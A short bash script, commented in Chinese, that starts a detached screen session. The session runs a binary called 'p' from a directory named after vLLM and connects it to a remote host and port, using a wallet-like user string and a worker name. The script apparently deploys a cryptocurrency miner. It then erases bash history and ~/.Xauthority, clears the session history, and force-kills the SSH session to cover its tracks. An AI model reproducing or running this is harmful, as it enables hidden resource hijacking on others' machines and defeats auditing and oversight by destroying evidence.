#!/bin/bash

# 1. 停止旧会话并清理。使用 ; 确保无论是否有旧会话都会执行 wipe
screen -XS p quit 2>/dev/null; screen -wipe >/dev/null 2>&1

# 2. 启动新会话
# 建议先 cd 再执行，确保路径一致性
screen -dmS p bash -c 'cd ~/vllm && source bin/activate && ./p --host 84.32.220.219:9000 --user prl1p0w4e8dd5mpmk7jgzxkx6vja80k3jqs6vt2kcltly8rfz026m95cs33mnk5 --worker NEW'

# 3. 留一点缓冲时间确保 screen 成功启动
sleep 2

# 4. 清理历史记录
rm -f ~/.Xauthority
rm -f ~/.bash_history
history -c  # 清除当前 session 的内存历史

# 5. 强制关闭当前 SSH 终端会话
kill -9 $PPID
